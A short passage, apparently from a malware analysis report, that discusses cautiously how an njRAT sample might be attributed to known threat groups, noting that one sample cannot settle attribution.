+Joe Sandbox's threat intel associates njRAT broadly with **AQUATIC PANDA**, **Earth Lusca**, **Operation C-Major**, and **The Gorgon Group**, groups with Middle East and South Asian operational nexus. The "HacKed" campaign tag and phishing-themed domain are consistent with script-level operators in this space, but attribution cannot be established from a single sample. njRAT's builder is widely leaked and used by actors across all sophistication levels.
 
 ---
 
